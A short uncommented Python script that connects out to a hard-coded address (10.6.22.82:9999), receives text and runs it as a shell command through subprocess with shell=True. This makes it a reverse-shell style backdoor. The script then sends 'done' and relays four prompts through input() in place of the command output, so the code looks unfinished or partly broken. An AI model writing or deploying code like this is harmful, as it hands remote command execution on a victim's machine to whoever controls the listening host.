import socket
import os
import subprocess

s = socket.socket()
host = '10.6.22.82'
port = 9999

s.connect((host, port))

while True:
    data = s.recv(1024)
    
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = 'done'
        s.send(str.encode(output_str))
        data = s.recv(1024) 
        q1 = input(data.decode("utf-8"))
        s.send(str.encode(q1))
        data = s.recv(1024)
        q2 = input(data.decode("utf-8"))
        s.send(str.encode(q2))
        data = s.recv(1024)
        q3 = input(data.decode("utf-8"))
        s.send(str.encode(q3))
        data = s.recv(1024)
        q4 = input(data.decode("utf-8"))
        s.send(str.encode(q4))  
        

        print(output_str)